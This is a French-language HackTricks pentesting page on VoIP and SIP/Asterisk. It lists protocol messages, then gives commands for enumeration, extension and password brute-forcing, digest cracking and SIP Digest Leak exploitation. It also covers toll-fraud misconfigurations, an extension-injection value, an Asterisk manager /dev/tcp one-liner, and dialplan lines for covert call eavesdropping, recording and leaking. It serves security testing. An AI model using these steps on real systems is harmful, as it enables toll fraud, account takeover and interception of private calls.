# Pentesting VoIP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## VoIP Basic Information

Pour commencer √† apprendre comment fonctionne le VoIP, consultez :

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Basic Messages
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Codes de R√©ponse

**1xx‚ÄîR√©ponses Provisoires**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚ÄîR√©ponses r√©ussies**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚ÄîR√©ponses de redirection**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚ÄîR√©ponses d'√©chec du client**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚ÄîR√©ponses d'√©chec du serveur**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚ÄîR√©ponses d'√©chec globales**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Num√©ros de t√©l√©phone

L'une des premi√®res √©tapes qu'une √©quipe rouge pourrait faire est de rechercher des num√©ros de t√©l√©phone disponibles pour contacter l'entreprise en utilisant des outils OSINT, des recherches Google ou en scrappant les pages web.

Une fois que vous avez les num√©ros de t√©l√©phone, vous pourriez utiliser des services en ligne pour identifier l'op√©rateur :

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Savoir si l'op√©rateur fournit des services VoIP vous permettrait d'identifier si l'entreprise utilise VoIP... De plus, il est possible que l'entreprise n'ait pas engag√© de services VoIP mais utilise des cartes PSTN pour connecter son propre PBX VoIP au r√©seau de t√©l√©phonie traditionnel.

Des √©l√©ments tels que des r√©ponses automatis√©es de musique indiquent g√©n√©ralement que VoIP est utilis√©.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informations OSINT

Toute autre √©num√©ration OSINT qui aide √† identifier le logiciel VoIP utilis√© sera utile pour une √©quipe rouge.

### √ânum√©ration du r√©seau

* **`nmap`** est capable de scanner les services UDP, mais en raison du nombre de services UDP scann√©s, il est tr√®s lent et peut ne pas √™tre tr√®s pr√©cis avec ce type de services.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** de SIPVicious (`sudo apt install sipvicious`): Localisera les services SIP dans le r√©seau indiqu√©.
* `svmap` est **facile √† bloquer** car il utilise l'User-Agent `friendly-scanner`, mais vous pourriez modifier le code de `/usr/share/sipvicious/sipvicious` et le changer.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** Le scan SIPPTS est un scanner tr√®s rapide pour les services SIP sur UDP, TCP ou TLS. Il utilise le multithreading et peut scanner de larges plages de r√©seaux. Il permet d'indiquer facilement une plage de ports, de scanner √† la fois TCP et UDP, d'utiliser une autre m√©thode (par d√©faut, il utilisera OPTIONS) et de sp√©cifier un User-Agent diff√©rent (et plus).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Extra Network Enumeration

Le PBX pourrait √©galement exposer d'autres services r√©seau tels que :

* **69/UDP (TFTP)** : Mises √† jour du firmware
* **80 (HTTP) / 443 (HTTPS)** : Pour g√©rer l'appareil depuis le web
* **389 (LDAP)** : Alternative pour stocker les informations des utilisateurs
* **3306 (MySQL)** : Base de donn√©es MySQL
* **5038 (Manager)** : Permet d'utiliser Asterisk depuis d'autres plateformes
* **5222 (XMPP)** : Messages utilisant Jabber
* **5432 (PostgreSQL)** : Base de donn√©es PostgreSQL
* Et d'autres...

### Methods Enumeration

Il est possible de trouver **quels m√©thodes sont disponibles** √† utiliser dans le PBX en utilisant `SIPPTS enumerate` de [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analyser les r√©ponses du serveur

Il est tr√®s important d'analyser les en-t√™tes qu'un serveur nous renvoie, en fonction du type de message et des en-t√™tes que nous envoyons. Avec `SIPPTS send` de [**sippts**](https://github.com/Pepelux/sippts), nous pouvons envoyer des messages personnalis√©s, en manipulant tous les en-t√™tes, et analyser la r√©ponse.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Il est √©galement possible d'obtenir des donn√©es si le serveur utilise des websockets. Avec `SIPPTS wssend` de [**sippts**](https://github.com/Pepelux/sippts), nous pouvons envoyer des messages WS personnalis√©s.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Enumeration des extensions

Les extensions dans un syst√®me PBX (Private Branch Exchange) se r√©f√®rent aux **identifiants internes uniques attribu√©s √† chaque** ligne t√©l√©phonique, appareil ou utilisateur au sein d'une organisation ou d'une entreprise. Les extensions permettent de **diriger les appels au sein de l'organisation de mani√®re efficace**, sans avoir besoin de num√©ros de t√©l√©phone externes individuels pour chaque utilisateur ou appareil.

* **`svwar`** de SIPVicious (`sudo apt install sipvicious`): `svwar` est un scanner de lignes d'extension SIP PBX gratuit. En concept, il fonctionne de mani√®re similaire aux wardialers traditionnels en **devinant une plage d'extensions ou une liste donn√©e d'extensions**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifie les extensions sur un serveur SIP. Sipexten peut v√©rifier de grands r√©seaux et des plages de ports.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Vous pouvez √©galement √©num√©rer les extensions/noms d'utilisateur avec metasploit :
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** est un **√©num√©rateur de brute-force de nom d'utilisateur** pour le protocole Inter Asterisk Exchange. enumIAX peut fonctionner en deux modes distincts : Deviner les noms d'utilisateur de mani√®re s√©quentielle ou Attaque par dictionnaire.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Attaques VoIP

### Force brute de mot de passe - en ligne

Ayant d√©couvert le **PBX** et quelques **extensions/noms d'utilisateur**, une √©quipe rouge pourrait essayer de **s'authentifier via la m√©thode `REGISTER`** √† une extension en utilisant un dictionnaire de mots de passe courants pour forcer l'authentification.

{% hint style="danger" %}
Notez qu'un **nom d'utilisateur** peut √™tre le m√™me que l'extension, mais cette pratique peut varier en fonction du syst√®me PBX, de sa configuration et des pr√©f√©rences de l'organisation...

Si le nom d'utilisateur n'est pas le m√™me que l'extension, vous devrez **d√©couvrir le nom d'utilisateur √† forcer**.
{% endhint %}

* **`svcrack`** de SIPVicious (`sudo apt install sipvicious`): SVCrack vous permet de craquer le mot de passe pour un nom d'utilisateur/extension sp√©cifique sur un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack est un cracker de mots de passe √† distance pour les services SIP. Rcrack peut tester des mots de passe pour plusieurs utilisateurs sur diff√©rentes IP et plages de ports.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing VoIP

Si vous trouvez du mat√©riel VoIP √† l'int√©rieur d'un **r√©seau Wifi ouvert**, vous pourriez **sniffer toutes les informations**. De plus, si vous √™tes √† l'int√©rieur d'un r√©seau plus ferm√© (connect√© via Ethernet ou Wifi prot√©g√©), vous pourriez effectuer des **attaques MitM telles que** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre le **PBX et la passerelle** afin de sniffer les informations.

Parmi les informations r√©seau, vous pourriez trouver des **identifiants web** pour g√©rer le mat√©riel, des **extensions** d'utilisateur, des **noms d'utilisateur**, des adresses **IP**, m√™me des **mots de passe hach√©s** et des **paquets RTP** que vous pourriez reproduire pour **entendre la conversation**, et plus encore.

Pour obtenir ces informations, vous pourriez utiliser des outils tels que Wireshark, tcpdump... mais un **outil sp√©cialement cr√©√© pour sniffer les conversations VoIP est** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Notez que si **TLS est utilis√© dans la communication SIP**, vous ne pourrez pas voir la communication SIP en clair.\
Il en sera de m√™me si **SRTP** et **ZRTP** sont utilis√©s, les **paquets RTP ne seront pas en texte clair**.
{% endhint %}

#### Identifiants SIP (Brute-Force de mot de passe - hors ligne)

[Consultez cet exemple pour mieux comprendre une **communication SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) pour apprendre comment les **identifiants sont envoy√©s**.

* **`sipdump`** & **`sipcrack`,** partie de **sipcrack** (`apt-get install sipcrack`): Ces outils peuvent **extraire** d'un **pcap** les **authentifications digestes** au sein du protocole SIP et les **bruteforcer**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Le dump SIPPTS peut extraire des authentifications digest √† partir d'un fichier pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack est un outil pour craquer les authentifications digest obtenues avec le dump SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark extrait des donn√©es du protocole SIP √† partir d'un fichier PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Codes DTMF

**Non seulement les identifiants SIP** peuvent √™tre trouv√©s dans le trafic r√©seau, il est √©galement possible de trouver des codes DTMF qui sont utilis√©s par exemple pour acc√©der √† la **messagerie vocale**.\
Il est possible d'envoyer ces codes dans des **messages SIP INFO**, dans **l'audio** ou √† l'int√©rieur des **paquets RTP**. Si les codes se trouvent √† l'int√©rieur des paquets RTP, vous pourriez couper cette partie de la conversation et utiliser l'outil multimo pour les extraire :
```bash
multimon -a DTMF -t wac pin.wav
```
### Appels gratuits / Mauvaises configurations des connexions Asterisks

Dans Asterisk, il est possible de permettre une connexion **d'une adresse IP sp√©cifique** ou de **n'importe quelle adresse IP** :
```
host=10.10.10.10
host=dynamic
```
Si une adresse IP est sp√©cifi√©e, l'h√¥te **n'aura pas besoin d'envoyer des requ√™tes REGISTER** de temps en temps (dans le paquet REGISTER, le temps de vie est envoy√©, g√©n√©ralement 30 minutes, ce qui signifie que dans d'autres sc√©narios, le t√©l√©phone devra s'enregistrer toutes les 30 minutes). Cependant, il devra avoir des ports ouverts permettant des connexions du serveur VoIP pour recevoir des appels.

Pour d√©finir les utilisateurs, ils peuvent √™tre d√©finis comme :

* **`type=user`** : L'utilisateur ne peut recevoir des appels qu'en tant qu'utilisateur.
* **`type=friend`** : Il est possible de passer des appels en tant que pair et de les recevoir en tant qu'utilisateur (utilis√© avec des extensions)
* **`type=peer`** : Il est possible d'envoyer et de recevoir des appels en tant que pair (SIP-trunks)

Il est √©galement possible d'√©tablir une confiance avec la variable insecure :

* **`insecure=port`** : Permet des connexions entre pairs valid√©es par IP.
* **`insecure=invite`** : Ne n√©cessite pas d'authentification pour les messages INVITE
* **`insecure=port,invite`** : Les deux

{% hint style="warning" %}
Lorsque **`type=friend`** est utilis√©, la **valeur** de la variable **host** **ne sera pas utilis√©e**, donc si un administrateur **malconfigure un SIP-trunk** en utilisant cette valeur, **tout le monde pourra s'y connecter**.

Par exemple, cette configuration serait vuln√©rable :\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Appels gratuits / Mauvaises configurations de contexte Asterisk

Dans Asterisk, un **contexte** est un conteneur ou une section nomm√©e dans le plan de num√©rotation qui **regroupe des extensions, des actions et des r√®gles connexes**. Le plan de num√©rotation est le composant central d'un syst√®me Asterisk, car il d√©finit **comment les appels entrants et sortants sont g√©r√©s et rout√©s**. Les contextes sont utilis√©s pour organiser le plan de num√©rotation, g√©rer le contr√¥le d'acc√®s et fournir une s√©paration entre diff√©rentes parties du syst√®me.

Chaque contexte est d√©fini dans le fichier de configuration, g√©n√©ralement dans le fichier **`extensions.conf`**. Les contextes sont not√©s par des crochets, avec le nom du contexte enferm√© √† l'int√©rieur. Par exemple :
```bash
csharpCopy code[my_context]
```
√Ä l'int√©rieur du contexte, vous d√©finissez des extensions (mod√®les de num√©ros compos√©s) et les associez √† une s√©rie d'actions ou d'applications. Ces actions d√©terminent comment l'appel est trait√©. Par exemple :
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Cet exemple d√©montre un contexte simple appel√© "my\_context" avec une extension "100". Lorsque quelqu'un compose le 100, l'appel sera r√©pondu, un message de bienvenue sera jou√©, puis l'appel sera termin√©.

Ceci est **un autre contexte** qui permet de **composer n'importe quel autre num√©ro** :
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Si l'administrateur d√©finit le **contexte par d√©faut** comme :
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Quiconque pourra utiliser le **serveur pour appeler n'importe quel autre num√©ro** (et l'administrateur du serveur paiera pour l'appel).
{% endhint %}

{% hint style="danger" %}
De plus, par d√©faut, le fichier **`sip.conf`** contient **`allowguest=true`**, donc **tout** attaquant sans **authentification** pourra appeler n'importe quel autre num√©ro.
{% endhint %}

*   **`SIPPTS invite`** de [**sippts**](https://github.com/Pepelux/sippts)**:** L'invitation SIPPTS v√©rifie si un **serveur PBX nous permet de passer des appels sans authentification**. Si le serveur SIP a une configuration incorrecte, il nous permettra de passer des appels vers des num√©ros externes. Il peut √©galement nous permettre de transf√©rer l'appel vers un deuxi√®me num√©ro externe.

Par exemple, si votre serveur Asterisk a une mauvaise configuration de contexte, vous pouvez accepter une demande INVITE sans autorisation. Dans ce cas, un attaquant peut passer des appels sans conna√Ætre aucun identifiant/mot de passe.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Appels gratuits / IVRS mal configur√©s

IVRS signifie **Syst√®me de R√©ponse Vocale Interactive**, une technologie de t√©l√©phonie qui permet aux utilisateurs d'interagir avec un syst√®me informatis√© par le biais d'entr√©es vocales ou de tonalit√©s. IVRS est utilis√© pour construire des syst√®mes de **gestion d'appels automatis√©s** qui offrent une gamme de fonctionnalit√©s, telles que la fourniture d'informations, le routage des appels et la capture des entr√©es des utilisateurs.

IVRS dans les syst√®mes VoIP se compose g√©n√©ralement de :

1. **Invitations vocales** : Messages audio pr√©enregistr√©s qui guident les utilisateurs √† travers les options et instructions du menu IVR.
2. **DTMF** (Dual-Tone Multi-Frequency) signalisation : Entr√©es de tonalit√© g√©n√©r√©es en appuyant sur des touches du t√©l√©phone, utilis√©es pour naviguer dans les menus IVR et fournir des entr√©es.
3. **Routage des appels** : Diriger les appels vers la destination appropri√©e, comme des d√©partements sp√©cifiques, des agents ou des extensions en fonction des entr√©es des utilisateurs.
4. **Capture des entr√©es utilisateur** : Collecter des informations aupr√®s des appelants, telles que des num√©ros de compte, des identifiants de cas ou toute autre donn√©e pertinente.
5. **Int√©gration avec des syst√®mes externes** : Connecter le syst√®me IVR √† des bases de donn√©es ou √† d'autres syst√®mes logiciels pour acc√©der ou mettre √† jour des informations, effectuer des actions ou d√©clencher des √©v√©nements.

Dans un syst√®me VoIP Asterisk, vous pouvez cr√©er un IVR en utilisant le plan de num√©rotation (**`extensions.conf`** fichier) et diverses applications telles que `Background()`, `Playback()`, `Read()`, et plus encore. Ces applications vous aident √† jouer des invitations vocales, √† capturer les entr√©es des utilisateurs et √† contr√¥ler le flux des appels.

#### Exemple de configuration vuln√©rable
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
L'exemple pr√©c√©dent est un exemple o√π l'utilisateur est invit√© √† **appuyer sur 1 pour appeler** un d√©partement, **2 pour appeler** un autre, ou **le num√©ro complet** s'il le conna√Æt.\
La vuln√©rabilit√© est le fait que la **longueur de l'extension indiqu√©e n'est pas v√©rifi√©e, donc un utilisateur pourrait entrer le d√©lai d'attente de 5 secondes un num√©ro complet et il sera appel√©.**

### Injection d'extension

En utilisant une extension telle que :
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
O√π **`${EXTEN}`** est l'**extension** qui sera appel√©e, lorsque **l'ext 101 est introduite**, voici ce qui se passerait :
```scss
exten => 101,1,Dial(SIP/101)
```
Cependant, si **`${EXTEN}`** permet d'introduire **plus que des chiffres** (comme dans les anciennes versions d'Asterisk), un attaquant pourrait introduire **`101&SIP123123123`** pour appeler le num√©ro de t√©l√©phone 123123123. Et ce serait le r√©sultat :
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Donc, un appel √† l'extension **`101`** et **`123123123`** sera envoy√© et seul le premier √† recevoir l'appel sera √©tabli... mais si un attaquant utilise une **extension qui contourne toute correspondance** qui est effectu√©e mais n'existe pas, il pourrait **injecter un appel uniquement au num√©ro souhait√©**.

## Vuln√©rabilit√© SIPDigestLeak

La vuln√©rabilit√© SIP Digest Leak affecte un grand nombre de t√©l√©phones SIP, y compris les t√©l√©phones IP mat√©riels et logiciels ainsi que les adaptateurs t√©l√©phoniques (VoIP vers analogique). La vuln√©rabilit√© permet **la fuite de la r√©ponse d'authentification Digest**, qui est calcul√©e √† partir du mot de passe. Une **attaque par mot de passe hors ligne est alors possible** et peut r√©cup√©rer la plupart des mots de passe bas√©s sur la r√©ponse au d√©fi.

**[Sc√©nario de vuln√©rabilit√© ici**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Un t√©l√©phone IP (victime) √©coute sur n'importe quel port (par exemple : 5060), acceptant les appels t√©l√©phoniques
2. L'attaquant envoie un INVITE au t√©l√©phone IP
3. Le t√©l√©phone de la victime commence √† sonner et quelqu'un d√©croche et raccroche (car personne ne r√©pond au t√©l√©phone √† l'autre bout)
4. Lorsque le t√©l√©phone est raccroch√©, le **t√©l√©phone de la victime envoie un BYE √† l'attaquant**
5. L'**attaquant √©met une r√©ponse 407** qui **demande une authentification** et √©met un d√©fi d'authentification
6. Le **t√©l√©phone de la victime fournit une r√©ponse au d√©fi d'authentification** dans un second BYE
7. L'**attaquant peut alors lancer une attaque par force brute** sur la r√©ponse au d√©fi sur sa machine locale (ou r√©seau distribu√©, etc.) et deviner le mot de passe

* **Fuite SIPPTS** de [**sippts**](https://github.com/Pepelux/sippts)**:** La fuite SIPPTS exploite la vuln√©rabilit√© SIP Digest Leak qui affecte un grand nombre de t√©l√©phones SIP. La sortie peut √™tre enregistr√©e au format SipCrack pour √™tre brute forc√©e en utilisant SIPPTS dcrack ou l'outil SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permet √† un **utilisateur web** (qui par exemple pourrait √™tre int√©ress√© par un produit) de **fournir** son **num√©ro de t√©l√©phone** pour √™tre rappel√©. Ensuite, un commercial sera appel√©, et quand il **r√©pond au t√©l√©phone**, l'utilisateur sera **appel√© et connect√© avec l'agent**.

Un profil Asterisk commun pour cela est :
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Le profil pr√©c√©dent permet √† **N'IMPORTE QUEL adresse IP de se connecter** (si le mot de passe est connu).
* Pour **organiser un appel**, comme sp√©cifi√© pr√©c√©demment, **aucune permission de lecture n'est n√©cessaire** et **seulement** **l'origine** en **√©criture** est requise.

Avec ces permissions, toute adresse IP connaissant le mot de passe pourrait se connecter et extraire trop d'infos, comme :

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Plus d'informations ou d'actions pourraient √™tre demand√©es.**

### **√âcoute clandestine**

Dans Asterisk, il est possible d'utiliser la commande **`ChanSpy`** en indiquant les **extensions √† surveiller** (ou toutes) pour entendre les conversations qui se d√©roulent. Cette commande doit √™tre assign√©e √† une extension.

Par exemple, **`exten => 333,1,ChanSpy('all',qb)`** indique que si vous **appelez** l'**extension 333**, elle **surveillera** **`toutes`** les extensions, **commencera √† √©couter** chaque fois qu'une nouvelle conversation commence (**`b`**) en mode silencieux (**`q`**) car nous ne voulons pas interagir. Vous pouvez passer d'une conversation √† une autre en appuyant sur **`*`**, ou en marquant le num√©ro de l'extension.

Il est √©galement possible d'utiliser **`ExtenSpy`** pour surveiller une seule extension.

Au lieu d'√©couter les conversations, il est possible de **les enregistrer dans des fichiers** en utilisant une extension telle que : 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Les appels seront enregistr√©s dans **`/tmp`**.

Vous pourriez m√™me faire en sorte qu'Asterisk **ex√©cute un script qui va leak l'appel** lorsqu'il est ferm√©.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Vuln√©rabilit√© RTCPBleed

**RTCPBleed** est un probl√®me de s√©curit√© majeur affectant les serveurs VoIP bas√©s sur Asterisk (publi√© en 2017). La vuln√©rabilit√© permet √† **RTP (Real Time Protocol) traffic**, qui transporte les conversations VoIP, d'√™tre **intercept√© et redirig√© par quiconque sur Internet**. Cela se produit parce que le trafic RTP contourne l'authentification lorsqu'il navigue √† travers les pare-feu NAT (Network Address Translation).

Les proxys RTP essaient de r√©soudre les **limitations NAT** affectant les syst√®mes RTC en proxyant les flux RTP entre deux parties ou plus. Lorsque le NAT est en place, le logiciel de proxy RTP ne peut souvent pas se fier aux informations IP et port RTP r√©cup√©r√©es via le signalement (par exemple, SIP). Par cons√©quent, un certain nombre de proxys RTP ont mis en ≈ìuvre un m√©canisme o√π un tel **tuplet IP et port est appris automatiquement**. Cela se fait souvent en inspectant le trafic RTP entrant et en marquant l'IP et le port source pour tout trafic RTP entrant comme ceux qui devraient √™tre r√©pondus. Ce m√©canisme, qui peut √™tre appel√© "mode d'apprentissage", **ne fait pas usage d'aucun type d'authentification**. Par cons√©quent, **les attaquants** peuvent **envoyer du trafic RTP au proxy RTP** et recevoir le trafic RTP proxy√© destin√© √† l'appelant ou au destinataire d'un flux RTP en cours. Nous appelons cette vuln√©rabilit√© RTP Bleed car elle permet aux attaquants de recevoir des flux m√©dias RTP destin√©s √† √™tre envoy√©s √† des utilisateurs l√©gitimes.

Un autre comportement int√©ressant des proxys RTP et des piles RTP est que parfois, **m√™me s'ils ne sont pas vuln√©rables √† RTP Bleed**, ils **acceptent, transmettent et/ou traitent des paquets RTP de n'importe quelle source**. Par cons√©quent, les attaquants peuvent envoyer des paquets RTP qui peuvent leur permettre d'injecter leur m√©dia au lieu du l√©gitime. Nous appelons cette attaque injection RTP car elle permet l'injection de paquets RTP ill√©gitimes dans des flux RTP existants. Cette vuln√©rabilit√© peut √™tre trouv√©e √† la fois dans les proxys RTP et les points de terminaison.

